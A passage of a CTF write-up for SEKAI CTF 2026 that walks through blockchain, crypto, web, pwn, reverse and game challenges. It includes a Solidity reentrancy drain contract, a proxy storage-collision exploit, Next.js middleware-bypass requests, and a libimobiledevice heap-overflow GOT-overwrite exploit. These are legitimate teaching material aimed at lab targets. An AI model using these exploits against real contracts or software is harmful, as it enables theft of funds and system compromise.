---
来源: https://cybersecurityelite.com/ctf-writeups/sekai-ctf-2026-writeup/
类型: html
获取日期: 2026-06-30
---

![SEKAI CTF 2026 writeup — eleven challenges solved across blockchain, crypto, web, pwn, reverse, game, and misc tracks](https://cybersecurityelite.com/images/articles/sekai-ctf-2026-writeup.png)Table of Contents

SEKAI CTF 2026 was a thick, multi-track event with carefully engineered bugs, documented here in a **CyberSecurity Elite** SEKAI CTF 2026 writeup. This writeup walks the eleven challenges I solved across seven categories: three on-chain bugs (a TON cross-instance economy exploit, the classic Solidity reentrancy, and a “fixed” Solidity build whose patch introduced a transparent-proxy storage collision), one cryptography puzzle that compresses into a single Python assertion, one Next.js web chain with three independent middleware bypasses, an AFC heap overflow in `libimobiledevice` that turns into a `puts@GOT → system` tcache rewrite, a Windows PE that hides an eBPF verifier inside a nested verifier payload, a six-puzzle pzpr.js logic-puzzle hunt with an SJCL-key-from-canonical-solution gimmick and a JIGSAW meta, a terminal-kit Bejeweled bot whose only real catch is that the win screen renders the flag on a different row than the time-out screen, an Android two-app conference badge whose `debuggable="true"` collapses the intended IPC-forgery chain into a single `adb run-as`, and an “impossible stego” challenge whose AI-gateway log of the author’s Claude session contains every `Write`/`Edit` tool call that built the stego package, including the baked-in `ROOT_SECRET`.

Original handouts, per-challenge READMEs, and full solver scripts live in [Abdelkad3r/SekaiCTF-2026](https://github.com/Abdelkad3r/SekaiCTF-2026). Where the author’s intended path was a longer chain I tried to walk it for a few hours before falling to the shorter path; both routes are documented in the per-challenge READMEs.

## The eleven SEKAI CTF 2026 challenges[#](#the-eleven-sekai-ctf-2026-challenges)

| Challenge | Category | Bug class / primitive | Flag |
| --- | --- | --- | --- |
| Open World | Blockchain (TON) | UUID-scoped API endpoint, shared TON economy. Donor instance claims free 50-jetton bonus, sells for ~100 TON, funds target wallet. Target instance buys the second 50 jettons and solves with a single 100-jetton transfer from its own wallet (which passes the contract’s authorization check). | `SEKAI{3Xp1or1ng-An-0pen-W0rld-15-FUN}` |
| PP Farming | Blockchain (Solidity) | Classic checks-effects-interactions reentrancy: `withdrawPP` sends ether before zeroing `scores[msg.sender]`. Attacker contract donates 1 ETH to itself, re-enters from `receive()` until the 11 ETH ATM is drained. | `SEKAI{...}` (see writeup) |
| PP Farming 2 | Blockchain (Solidity) | “Fixed” reentrancy. The patch introduces an opt-in transparent proxy fallback that delegate-calls every selector except `processWithdrawal` to a helper. Helper’s storage is deliberately aligned so `setATM(address)` (no auth) reached through the ATM overwrites the ATM’s `processor` slot; `withdrawPP` then delegate-calls attacker code in the ATM’s own context. | `SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}` |
| oneline6ryp7o | Crypto | Single-line assertion: `SEKAI{[67]{67}}` regex + divisibility by `2^67 - 1`. `gcd(8, 67) = 1` makes each character independently control one bit of the residue mod `2^67 - 1`. The required bitmask is `(-int.from_bytes(base.encode(), "big")) % (2**67 - 1)`. | `SEKAI{6777676667...666666}` (67 chars) |
| Migurimental | Web (Next.js) | Three independent bypasses chained across two backstages. (1) `nxtPid=<self>&id=1` query-prefix confusion lets middleware see your id while `getServerSideProps` reads Miku’s. (2) Duplicate `ticket_uuid` cookies resolve differently in middleware versus page handler. (3) `assetPrefix: '/cdn'` rewrites `/cdn/_next/data/<build>/index.json` to the protected root after the middleware matcher already declined. | `SEKAI{7h3_l33k_15_b4ck_...m1ku_m1ku_b34mmmmmmmmmmmm}` |
| ppp | Pwn | Apple File Conduit client. `libimobiledevice`’s `afc_receive_data()` allocates `entire_length` bytes but reads `this_length` bytes without `this_length <= entire_length` validation. Heap overflow into a freed `0x20` tcache list-vector chunk corrupts its `next` to `puts@GOT - 8`, so the next string allocation overwrites `puts@GOT` with `system`. Next `ls` calls `system("/readflag sekai ppp ...")`. | `SEKAI{du_bist_gut_genuggggggggggggg}` |
| Untitled Encore | Reverse | Windows PE wrapping an embedded 0xbb8-byte eBPF ELF. `.rodata` contains a nested 388-byte verifier with a per-PC XOR keystream. After 32 direct chart byte-checks pass, the eBPF VM compares a 32-byte block; the final flag key derives from a custom 32-byte byte-mixing hash (Unicorn-emulated) of the aggregate parser state, the VM output, and the chart. | `SEKAI{eBPF_my_B3l0v3d}` |
| 6-7 Puzzle Hunt | Game | Six pzpr.js logic puzzles (Tapa, Nurikabe, Fillomino, Shikaku, Skyscrapers, Kakuro), every clue 6 or 7. Each puzzle’s canonical solution string is the SJCL key for that puzzle’s `data-ct` secret. Six decrypted heptominoes spell `JIGSAW`; an exact-cover meta on a 6×7 grid reveals the flag sentence. | `SEKAI{SCRIBBLE_67_LIKE_ITS_A_SEXY_INTEGER}` |
| Bejeweled | Game | terminal-kit Bejeweled over raw TCP with SGR mouse mode. The bot picks the best swap weighted by match length then by bottom-row bias for cascade chances. The actual catch: the **win** screen layout puts the flag on row 13, while the **time-out** screen leaves row 13 blank, so an end-of-game dumper that filters by time-out template never sees it. | `SEKAI{th3_l4st_d4nc3_By_eana}` |
| SekaiID | Misc (Android) | Two-app conference badge / verifier. Intended chain is `ACTION_PRESENT_CREDENTIAL` redirection + `claimsTag` HMAC forgery against an exported `CompanionInfoProvider`-leaked fingerprint. The actual short circuit is `android:debuggable="true"` on both apps plus `/system/flag.txt` owned by the verifier UID. One `adb shell run-as com.sekai.verifier cat /system/flag.txt` returns the flag. | `SEKAI{welcome-to-the-conference!}` |
| impossible stego | Misc (Stego) | 23 MB `messages.log` is the author’s Claude session captured at the AI gateway. Last `POST /v1/messages` body holds the full conversation history. Replaying every `Write`/`Edit` tool call rebuilds the `stego/` Python package (with `ROOT_SECRET`, S-box seed, and salts baked into `stego/secret.py`). `stego.extract(flag.png)` returns the flag. | `SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_..._0pus}` |

The pattern that connects most of these: the intended bug is one chain, and the shipped artefact accidentally permits a shorter one. PP Farming 2 reentrancy-guards `withdrawPP` and still loses the contract to a storage collision through the fallback. Migurimental authenticates middleware-style and forgets that the data-route rewrite skips the matcher. SekaiID ships a complete IPC-forgery puzzle and forgets `android:debuggable="false"`. The skill is enumerating every supposed gate before assuming the puzzle starts at the intended one.

## Methodology — enumerate every gate, attack the cheapest[#](#methodology--enumerate-every-gate-attack-the-cheapest)

A pattern that worked across the track: list every supposed authorisation check, every supposed isolation boundary, every supposed input validation, then walk them looking for the one that does not actually exist. For Open World the gates were “API endpoint is UUID-scoped” (real), “wallets are per-instance” (false: TON economy is shared). For PP Farming 2 the gates were “reentrancy guard” (real), “fallback is a transparent proxy that only refuses one selector” (real), “helper storage layout is unrelated to the ATM’s” (false: deliberately aligned). For Migurimental the gates were “middleware checks `id` against session” (real for the literal `id` param), “page reads `req.cookies.ticket_uuid`” (real for whichever value Node picks first on duplicate cookies), “middleware matcher protects `/`” (real for `/`, false for `/cdn/_next/data/<build>/index.json`).

Once the broken gate is identified, the exploit is usually three lines of glue. The hours go into enumeration. For SekaiID I spent a full hour walking the intended IPC chain (the `BadgeShareActivity` `FLAG_GRANT_READ_URI_PERMISSION` reflection, the `CompanionInfoProvider` fingerprint leak, the `IdentityProviderActivity`’s `getCallingPackage()` task-hijack workaround) before noticing that both manifests ship with `android:debuggable="true"`. The intended path is a clean Android-IPC puzzle worth its 100 points; the shipped path is one `adb` command.

Per-challenge walkthroughs follow.

## Blockchain[#](#blockchain)

### Open World[#](#open-world)

A TON challenge with a small jetton economy deployed by a TLS launcher. Each `new` request spins up a fresh `Challenge` contract, a player wallet, and a UUID-scoped API endpoint. The goal is to make `isSolved()` return true and then ask the launcher for the flag with that UUID.

#### Step 1 — Read the solve condition[#](#step-1--read-the-solve-condition)

The `Solve` handler in `Challenge.tolk` only checks who initiated the transfer and how many jettons came with it:

```
Solve => {
    if (msg.transferInitiator != null && storage.player == msg.transferInitiator!) {
        if (msg.jettonAmount >= FLAG_PRICE) {
            storage.isSolved = true;
            storage.save();
        }
    }
}
```

`FLAG_PRICE = 100` jettons, `TOKEN_PRICE = 2 TON` per jetton. So solving costs 100 jettons in a single transfer from the target player wallet.

#### Step 2 — Map the economic gates[#](#step-2--map-the-economic-gates)

Three flows are available:

```
PlayerBonus => { ... jettonAmount: FLAG_PRICE / 2; mintRecipient: senderAddress }  // free 50 jettons, once
Sell        => { ... value: jettonAmount * TOKEN_PRICE; dest: transferInitiator }    // 2 TON per jetton
Buy         => { ... assert in.valueCoins > msg.amount * TOKEN_PRICE + 0.12 TON }    // mint paid jettons
```

The single-instance “obvious” path is `PlayerBonus → Sell → Buy`. That gives 50 free jettons, 100 TON in pocket, and 50 more jettons after buying. The Sell step consumes the bonus jettons, so the net jetton count is 50, not 100. The `Solve` handler demands a single 100-jetton transfer. Single-instance is infeasible.

#### Step 3 — Spot the cross-instance bug[#](#step-3--spot-the-cross-instance-bug)

The instance launcher gives each player a UUID-scoped API endpoint. The mistake is that the API path is scoped, but the deployed wallets all live in the same local TON world. A wallet from one instance can fund the wallet of another instance, and the `Solve` handler does not care where the TON used to pay for the `Buy` came from.

#### Step 4 — Build the donor/target economy[#](#step-4--build-the-donortarget-economy)

Use two instances. Donor monetises its bonus; target buys the second half.

```
donor:  PlayerBonus → 50 jettons → Sell → ~100 TON
target: PlayerBonus → 50 jettons
donor:  transfer 99.75 TON → target wallet
target: Buy 50 jettons (cost 100 TON + 0.12 TON gas)
target: Solve transfer (100 jettons → target challenge wallet)
```

The final transfer is initiated by the target player wallet, so it passes the `transferInitiator == storage.player` check. The contract has no view into where the TON came from.

#### Step 5 — Run the solver[#](#step-5--run-the-solver)

```
cd blockchain/open-world/exploit
npm install
python3 solve.py --host open-world-<instance>.instancer.sekai.team --port 1337
```

Checkpoints from the live solve:

```
donor jettons after bonus:       50
donor TON after selling bonus:   100.526464484
target jettons after bonus:      50
target TON after donor funding:  100.474579398
target jettons after buy:        100
target isSolved():               true
```

Launcher returns `SEKAI{3Xp1or1ng-An-0pen-W0rld-15-FUN}`. Per-challenge README and full Node/Python solver: [blockchain/open-world](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/blockchain/open-world).

### PP Farming[#](#pp-farming)

The textbook checks-effects-interactions reentrancy. A `PerformancePointATM` deployed with 10 ETH; `isSolved()` is `address(this).balance == 0`. The vulnerable flow is `withdrawPP`:

```
function withdrawPP() public {
    uint256 score = scores[msg.sender];
    require(score > 0, "Nothing to withdraw");
    (bool result, ) = msg.sender.call{value: score}("");
    require(result, "Transfer failed");
    scores[msg.sender] = 0;
}
```

State reset (`scores[msg.sender] = 0`) happens after the external `call`. A receiving contract’s `receive()` runs before the reset and can re-enter `withdrawPP` with the old score still in storage.

#### Step 1 — Build the exploit contract[#](#step-1--build-the-exploit-contract)

```
contract PPFarmExploit {
    PerformancePointATM atm;
    uint256 chunk;
    address payable owner;
    constructor(address payable t) payable { atm = PerformancePointATM(t); owner = payable(msg.sender); }
    function attack() external payable {
        chunk = msg.value;
        atm.donatePP{value: msg.value}(address(this));   // seed score
        atm.withdrawPP();                                 // start the chain
        owner.transfer(address(this).balance);            // sweep
    }
    receive() external payable {
        if (address(atm).balance >= chunk) atm.withdrawPP();
    }
}
```

The `chunk` guard avoids one extra failed re-entrant call when the target no longer has enough ether to pay another full withdrawal.

#### Step 2 — Run the drain[#](#step-2--run-the-drain)

```
forge create exploit/PPFarmExploit.sol:PPFarmExploit \
    --broadcast --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" \
    --constructor-args "$TARGET"

cast send "$EXPLOIT" 'attack()' --value 1ether \
    --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY"
```

The 1 ETH seed becomes the score; the ATM balance is 11 ETH after the donation; the same 1 ETH is withdrawn eleven times via recursion; `isSolved()` flips. Per-challenge README and exploit Solidity: [blockchain/pp-farming](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/blockchain/pp-farming).

### PP Farming 2[#](#pp-farming-2)

The “I fixed the issue. I think&mldr” follow-up. The patch refactors withdrawal through a second contract and adds a `locked` reentrancy guard. Both look right at a glance. They are not.

#### Step 1 — Recognise the transparent proxy[#](#step-1--recognise-the-transparent-proxy)

The patched `PerformancePointATM` has a `fallback()` that delegate-calls everything except `processWithdrawal` to a helper:

```
fallback() external payable {
    bytes4 sel; assembly { sel := calldataload(0) }
    require(sel != bytes4(0x8260910c), "processWithdrawal blocked");
    address proc = processor;
    assembly {
        calldatacopy(0, 0, calldatasize())
        let ok := delegatecall(gas(), proc, 0, calldatasize(), 0, 0)
        ...
    }
}
```

Only `processWithdrawal` is gated. Every other selector reaches the helper through the proxy, executing in the ATM’s storage context.

#### Step 2 — Find the storage collision[#](#step-2--find-the-storage-collision)

The helper’s storage layout is deliberately aligned with the ATM’s:

```
// ATM:
mapping(address => uint256) scores;   // slot 0
address processor;                    // slot 1, bytes 0..19
bool    locked;                       // slot 1, byte 20

// Helper (Processor):
uint256 _gap;                         // slot 0 — left empty on purpose
address atm;                          // slot 1, bytes 0..19
bool    locked;                       // slot 1, byte 20
```

The helper’s `_gap` is the giveaway: it exists only to align the next two fields with the ATM’s `processor`/`locked` pair. Any `SSTORE` the helper performs while running under `delegatecall` lands on the ATM’s identically-shaped slot.

#### Step 3 — Notice the missing access control[#](#step-3--notice-the-missing-access-control)

The helper’s `setATM(address)` has no caller check:

```
function setATM(address _atm) external { atm = _atm; }   // no auth
```

Reachable through the ATM’s transparent proxy fallback. The selector is `0x9a2ba7a8`.

#### Step 4 — Build the three-tx exploit[#](#step-4--build-the-three-tx-exploit)

```
contract MaliciousProcessor {
    address payable public immutable player;
    constructor(address payable _player) { player = _player; }
    function processWithdrawal(address, uint256) external returns (bool) {
        (bool ok, ) = player.call{value: address(this).balance}("");
        require(ok, "drain failed");
        return true;
    }
}
```

Three transactions on the live instance:

```
# (1) seed a score so withdrawPP passes require(score > 0)
cast send $TARGET 'donatePP(address)' $PLAYER --value 0.01ether ...

# (2) overwrite ATM.processor via the fallback (0x9a2ba7a8 = setATM(address))
cast send $TARGET 0x9a2ba7a8000000000000000000000000${MAL:2} ...

# (3) withdrawPP delegate-calls MaliciousProcessor in ATM context;
#     payable(player).call{value: address(this).balance}("") moves all 10 ETH out
cast send $TARGET 'withdrawPP()' ...
```

`isSolved()` flips, instancer detects the solve, flag pops out:

```
SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}
```

Per-challenge README + Solidity exploit + `solve.sh`: [blockchain/pp-farming-2](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/blockchain/pp-farming-2).

The deeper lesson is that a `delegatecall` to a helper with attacker-reachable mutators is two distinct primitives composed: a transparent proxy that doesn’t refuse unknown selectors, and a helper that lets external callers write to storage. Either is fine in isolation. Together they hand the caller the proxy’s storage.

## Crypto[#](#crypto)

### oneline6ryp7o[#](#oneline6ryp7o)

The entire challenge is one Python assertion:

```
assert __import__('re').match('SEKAI{[67]{67}}$', flag := input()) \
       and not int.from_bytes(flag.encode()) % ~(6 + ~7) ** 67
```

The regex pins the wrapper and shape: `SEKAI{` + 67 characters each in `{6, 7}` + `}`. The hard part is the modulus.

#### Step 1 — Decode the modulus[#](#step-1--decode-the-modulus)

Python’s `~` is bitwise-not, equivalent to `-x - 1`:

```
~7        == -8
6 + ~7    == -2
(-2) ** 67 == -2**67
~(-2**67) == 2**67 - 1
```

So the constraint is `int.from_bytes(flag.encode()) % (2**67 - 1) == 0`. Call `M = 2**67 - 1`.

#### Step 2 — See each character as a single-bit lever[#](#step-2--see-each-character-as-a-single-bit-lever)

Start with `base = "SEKAI{" + "6"*67 + "}"`. Changing one inner byte from `6` (`0x36`) to `7` (`0x37`) adds 1 at that byte position. If the byte is `k` positions from the right, the added value is `256^k = 2^(8k)`.

Modulo `M`, powers of two wrap every 67 bits: `2^67 ≡ 1 (mod M)`. So each character `j` (counted from the left, inside the brace) contributes `2^((8 * (len(base) - 1 - byte_index_of_j)) mod 67)` to the residue when flipped.

Because `gcd(8, 67) = 1`, the map `k → 8k mod 67` is a permutation of `{0, 1, ..., 66}`. So each of the 67 characters independently controls exactly one bit of the residue modulo `M`.

#### Step 3 — Compute the required bitmask[#](#step-3--compute-the-required-bitmask)

The target is the residue that cancels the baseline:

```
target = (-int.from_bytes(base.encode(), "big")) % M
```

The binary representation of `target` is the bitmask. For each `j` in `0..66`, flip the character to `7` iff the corresponding bit of `target` is 1:

```
inner = []
for j in range(67):
    byte_index = len(prefix) + j
    exponent = (8 * (len(base) - 1 - byte_index)) % 67
    inner.append("7" if (target >> exponent) & 1 else "6")
flag = "SEKAI{" + "".join(inner) + "}"
```

#### Step 4 — Verify[#](#step-4--verify)

```
python3 solve.py
```

```
SEKAI{6777676667666666677676776776777766777777777776777767777776677666666}
```

The script re-checks the regex and the divisibility, both pass. Per-challenge README and solver: [crypto/oneline6ryp7o](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/crypto/oneline6ryp7o).

## Web[#](#web)

### Migurimental[#](#migurimental)

A Next.js challenge split across two backstages behind the same nginx. The flag is also split: `flag.slice(0, ceil(L/2))` in backstage1, `flag.slice(ceil(L/2))` in backstage2. Three independent bugs need composing.

#### Step 1 — Leak Miku’s ticket UUID (first half, gate 1)[#](#step-1--leak-mikus-ticket-uuid-first-half-gate-1)

The seeded VIP user is `id = 1`, username `miku`. The access-card page renders the user’s ticket as a QR code:

```
export async function getServerSideProps({ query }) {
  const user = await findById(query.id)
  ...
  return { props: { user: { id, username, tier }, qrDataUrl } }
}
```

The middleware tries to stop a normal user from viewing another id’s access card:

```
if (request.nextUrl.pathname === '/access-card') {
  const checkedId = request.nextUrl.searchParams.get('id')
  if (checkedId !== session.sub) return deny(request)
}
```

`nxtP` is an internal Next.js query prefix. During routing, `?nxtPid=<our-id>` is normalised into `id=<our-id>` early enough for the middleware. Sending the request with both `nxtPid` and `id`:

```
/access-card?nxtPid=<our_id>&id=1
```

The middleware reads `id=<our_id>` (normalised from `nxtPid`) and passes the request. `getServerSideProps` reads `query.id = 1` and renders Miku’s QR code, which decodes to her ticket UUID.

```
curl -sk -H 'Cookie: session=<ours>; ticket_uuid=<ours>' \
  'https://migurimental.chals.sekai.team/access-card?nxtPid=<our_id>&id=1'
```

#### Step 2 — Enter the backroom (first half, gate 2)[#](#step-2--enter-the-backroom-first-half-gate-2)

The backroom checks `req.cookies.ticket_uuid` against Miku’s UUID. The middleware separately checks the same cookie against the session’s embedded ticket. Duplicate cookies break that contract: middleware and the page handler can resolve the same cookie name differently.

```
Cookie: session=<our_session>; ticket_uuid=<miku_ticket>; ticket_uuid=<our_ticket>
```

Middleware sees our ticket (passes); the page reads Miku’s ticket (returns the first half):

```
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
```

#### Step 3 — Reach the protected root on backstage2 (second half)[#](#step-3--reach-the-protected-root-on-backstage2-second-half)

The second app’s middleware refuses any request to `/` unless `X-Real-Migu` equals `1.3.3.7`. nginx unconditionally overwrites `X-Real-Migu` with the remote address, so the header can’t be forged from the client.

`next.config.js` sets `assetPrefix: '/cdn'`. The middleware matcher is `['/']`. The data-route rewrite for the root page is `/cdn/_next/data/<build-id>/index.json → /_next/data/<build-id>/index.json`. The rewrite happens after the middleware matcher already declined to match (`/cdn/_next/data/...` does not match `/`).

The build id is visible on `/rejected` (which is the redirect target). On the live instance it was `nRVcVzPJ7U21AcMTs21fY`:

```
curl -sk 'https://migurimental-2.chals.sekai.team/cdn/_next/data/nRVcVzPJ7U21AcMTs21fY/index.json'
```

That request bypasses the matcher, hits the data route for `/`, runs `getServerSideProps`, and returns:

```
c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

#### Step 4 — Concatenate[#](#step-4--concatenate)

```
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

Per-challenge README + `solve.py`: [web/migurimental](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/web/migurimental).

The composition is what makes this challenge fun. Each individual bug is small. The Next.js `nxtP` query-prefix confusion is a known framework footgun, duplicate-cookie disagreement is the kind of trust-boundary mistake any framework can permit, and asset-prefix rewriting an unprotected data route is a routing-order bug. Composing three of them across two apps is the real puzzle.

## Pwn[#](#pwn)

### ppp[#](#ppp)

An interactive Apple File Conduit client. The vulnerable parsing code is not in the challenge wrapper at all; it’s in the pinned `libimobiledevice` AFC implementation. Because the wrapper is talking to a fake AFC “device” controlled by the player, the wire-level parser is reachable directly.

#### Step 1 — Catch the parser bug[#](#step-1--catch-the-parser-bug)

AFC packets start with a 40-byte header:

```
typedef struct {
    char     magic[8];
    uint64_t entire_length;
    uint64_t this_length;
    uint64_t packet_num;
    uint64_t operation;
} AFCPacket;
```

`afc_receive_data()` truncates both lengths to 32 bits, allocates `entire_length` bytes, then reads `this_length` bytes into the buffer without checking that `this_length <= entire_length`:

```
entire_len = (uint32_t)header.entire_length - sizeof(AFCPacket);
this_len   = (uint32_t)header.this_length   - sizeof(AFCPacket);

buf = (char*)malloc(entire_len);
if (this_len > 0) {
    err = service_to_afc_error(service_receive(client->parent, buf, this_len, &recv_len));
}
```

A forged response with `this_length > entire_length` is a directly-reachable heap overflow.

#### Step 2 — Plan the GOT overwrite[#](#step-2--plan-the-got-overwrite)

The wrapper is non-PIE with a writable PLT/GOT:

```
0x4040a0  afc_file_write@GOT
0x4040a8  puts@GOT
```

After `afc_read_directory()` returns a list, the wrapper calls `puts()` on every entry to print the names. If `puts@GOT` points at libc `system`, `puts(list[0])` is `system(list[0])`, and the first entry can be `"/readflag sekai ppp ..."`.

The libc shipped with the handout has `system` at offset `0x52290`. The nsjail hook disables ASLR (`persona_addr_no_randomize: true`), so the libc base is deterministic: `0x7ffff7d65000`, putting `system` at `0x7ffff7db7290`.

#### Step 3 — Prepare tcache with `ls /`[#](#step-3--prepare-tcache-with-ls-)

First AFC response: a normal directory listing with two names padded to fit a `0x110` data chunk:

```
"A\0" + "BBBBB...BBBB\0"  padded to 0x100 bytes
```

`afc_read_directory()` allocates a `char **` list vector in the `0x20` tcache bin, a one-byte `strdup("A")` in the same bin, and a longer string for the `B...` entry. After `print_names()` runs and frees them, the `0x20` bin has freed chunks available for poisoning.

#### Step 4 — Poison the freed list-vector[#](#step-4--poison-the-freed-list-vector)

Second AFC response (`mkdir /x`) with a malformed header:

```
entire_length = 40 + 0x100
this_length   = 40 + 0x118
```

`afc_receive_data()` allocates the `0x110` data chunk and reads `0x118` bytes into it. The 8-byte overrun lands on the freed `0x20` list vector’s tcache `next` pointer, replacing it with `0x4040a0` (eight bytes before `puts@GOT`). `mkdir` is the right command for this stage because its receive path does not parse the buffer as a directory list, so embedded NUL bytes in the poison pointer are safe.

#### Step 5 — Overwrite `puts@GOT` with `system`[#](#step-5--overwrite-putsgot-with-system)

Final AFC response (`ls /`) with two strings:

```
"/readflag sekai ppp # CCCCC..."
"XXXXXXXX" + p64(system)[:6]
```

The list-vector allocation now comes from the poisoned tcache entry at `0x4040a0`. The second string’s contents are copied directly into the GOT area:

```
0x4040a0: "XXXXXXXX"
0x4040a8: system
```

`puts(list[0])` is now `system("/readflag sekai ppp # CCCCC...")`. The trailing `#` turns the rest of the buffer into a shell comment so the right command still executes.

#### Step 6 — Run and read[#](#step-6--run-and-read)

```
python3 exploit/exploit.py --host ppp.chals.sekai.team --port 1337
```

```
afc> A
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
afc> SEKAI{du_bist_gut_genuggggggggggggg}
sh: 1: XXXXXXXX...: not found
double free or corruption (out)
```

The post-flag crash is expected: the GOT overwrite means the wrapper interprets `list[1]` as another shell command, and the heap is already corrupted by design. The flag is printed before any of that matters.

Per-challenge README and full Python exploit: [pwn/ppp](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/pwn/ppp).

## Reverse[#](#reverse)

### Untitled Encore[#](#untitled-encore)

A 40-byte “chart” → eBPF VM check → custom-hash KDF → ChaCha-like decryption of an embedded ciphertext. The chart structure is what most of the visible reversing budget goes into.

#### Step 1 — Find the embedded eBPF ELF[#](#step-1--find-the-embedded-ebpf-elf)

The PE’s `.rdata` section at virtual address `0x14000e700` holds `0xbb8` bytes starting with `7f 45 4c 46 02 01 01 00 ...`, a 64-bit little-endian eBPF relocatable. Useful sections are `.text` (`0x40 + 0x8b0`) and `.rodata` (`0x8f0 + 0x1ac`).

#### Step 2 — Parse the chart format[#](#step-2--parse-the-chart-format)

Input is 40 bytes = 20 two-byte notes. The first byte is bit-packed; the parser rejects invalid fields:

```
lane   = b0 & 7         ≤ 4
kind   = (b0 >> 3) & 3  ≤ 2
flick  = (b0 >> 5) & 1
parity = (b0 >> 6) & 1   ((lane - i) & 1) == parity
3 ≤ b1 ≤ 16
```

Parsing updates four 32-bit aggregate state words, five lane sums, three kind sums, and a 25-bit coverage mask. The target aggregates from the binary are:

```
state0..3 = d75245e2, 3bbe10e9, 3c500f48, 01ebd885
lane sums = 38, 22, 36, 21, 41
kind sums = 61, 49, 3c
```

Two parser detail traps: `lane_sum[lane] += 5*flick + 3*kind + parity + b1` (no `lane` term), and `kind_sum[kind] += (i & 3) + lane + b1` (uses `i & 3`, not the running position).

#### Step 3 — Decode the nested verifier[#](#step-3--decode-the-nested-verifier)

`.rodata` starts with a 14-byte marker, then a payload descriptor:

```
type = 0x02, skip = 0x16, length = 0x0184, start = 0x28
```

That gives a 388-byte verifier program. Each 4-byte instruction at offset `off` is XOR-decoded byte-by-byte with a per-PC keystream:

```
insn[0] = raw[0] ^ ((off * 0x11 - 0x5d) & 0xff)
insn[1] = raw[1] ^ ((off * 0x1d + 0x11) & 0xff)
insn[2] = raw[2] ^ ((off * 0x1f + 0x7b) & 0xff)
insn[3] = raw[3] ^ ((off * 0x25 - 0x3b) & 0xff)
```

Decoded, the verifier program has:

```
12  × opcode 0x21  (marker checks)
20  × opcode 0x44  (direct chart-byte equality checks)
32  × opcode 0x62  (block generation)
32  × opcode 0x8b  (block generation)
1   × opcode 0xf0  (terminal)
```

The 20 `0x44` direct checks plus the aggregate parser constraints leave exactly one valid chart:

```
000c01070a072305140d0b062a06010b1008640408090105320a03050c0f6203100c740649070309
```

#### Step 4 — Run the eBPF VM compare[#](#step-4--run-the-ebpf-vm-compare)

Opcodes `0x62` and `0x8b` generate two 32-byte blocks. The PE feeds an input vector built from the chart and `first32` to the embedded eBPF VM and compares the VM output against `vm32`:

```
first32 = 33d263e1008c774e67812c7fb6567b2eb4986d3b028ce0b88146cdbd7f796e9b
vm32    = 4d035adf070143b586d290f25a23ea6c4de4ae932cc64110e3a4d311bc6d6640
```

Once the compare passes, `vm32` is one of the inputs to the flag’s key derivation.

#### Step 5 — Derive the stream and decrypt[#](#step-5--derive-the-stream-and-decrypt)

Final material is a 32-byte hash of the aggregate parser output. The hash routine at `0x140009070` is a custom byte-mixing function that resists naive porting; emulating it with Unicorn over a small input is faster than reimplementing it.

```
material = 0cc20e93c3a950f68dd7833c39e6ce0f74de212400bb891c690d3814456c44a4
seed     = hash([prefix10, material32, vm32, chart40])
         = 2a4396f3362b6130e4233131858beb398a31ff1adee10cdebd7adfa7b49b4fe1
```

Expand `seed` with counter blocks, XOR against the embedded `0x16`-byte ciphertext:

```
ciphertext: 73882f9f36ccbbdeb1d848b5ceaa5156cbb6bc6379a2
plaintext:  SEKAI{eBPF_my_B3l0v3d}
```

```
.venv/bin/python exploit/solve.py
```

Per-challenge README and full solver: [reverse/untitled-encore](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/reverse/untitled-encore).

The take-home for reverse engineering layered formats: keep each boundary separate. Treat the PE’s chart parser as the source of structural constraints, extract the eBPF object and the verifier payload separately, decode the verifier, then use its direct checks (cheap) before solving the aggregate equations (expensive). Emulate any custom hash with Unicorn rather than porting it by hand.

## Game[#](#game)

### 6-7 Puzzle Hunt[#](#6-7-puzzle-hunt)

Six handcrafted pzpr.js logic puzzles, every clue is 6 or 7. The flag is not on the page; each puzzle’s solved canonical string is the SJCL key for an encrypted secret on its `<a>` tag’s `data-ct`. Six secrets unlock heptomino pieces that spell `JIGSAW` and assemble into a 6×7 meta grid that contains the flag.

#### Step 1 — Read the canonical-key construction[#](#step-1--read-the-canonical-key-construction)

The page itself contains the encoder, verbatim from the challenge JS:

```
function getCanonicalTokenForCurrentPuzzle(board, id) {
  function getBits(kind, encoder) { ... iterate board cells/borders ... }
  switch (id) {
    case "tapa": case "nurikabe":    return getBits("cell",   c => c.qans);
    case "skyscrapers": case "kakuro": return getBits("cell", c => c.anum + 1);
    case "fillomino":   return getBits("border", b => b.qans | b.isCmp());
    case "shikaku":     return getBits("border", b => b.qans);
  }
}
```

For Tapa/Nurikabe the token is a 100-character `0`/`1` cell string. For Skyscrapers/Kakuro it is a digit string. For Fillomino/Shikaku it is a 180-character border string. Get any of those formats wrong and SJCL throws; there is no “wrong key” feedback.

#### Step 2 — Solve each puzzle programmatically[#](#step-2--solve-each-puzzle-programmatically)

All six are small (≤ 10×10), so CP-SAT or Z3 finishes in seconds. The non-obvious model is Tapa’s “exactly one maximal run of black neighbours on the 8-cell ring equal to the clue value,” which expands into per-clue enumeration over the 8 ring rotations. For 4-connectivity (Tapa’s black region, Nurikabe’s islands, Fillomino’s same-value regions), encoding connectivity as a strictly-decreasing distance variable to a chosen root is the cleanest pattern.

One puzzle-specific trap worth calling out: Fillomino does not require all regions to be size 6 or 7 just because all clues are 6 or 7. Unclued regions can be any size. Restricting the model to size-6 and size-7 polyominoes is infeasible on this grid. With size 1–9 allowed the solver finds a unique solution mixing 1-, 2-, 6-, and 7-cell regions.

#### Step 3 — Reproduce the canonical token exactly[#](#step-3--reproduce-the-canonical-token-exactly)

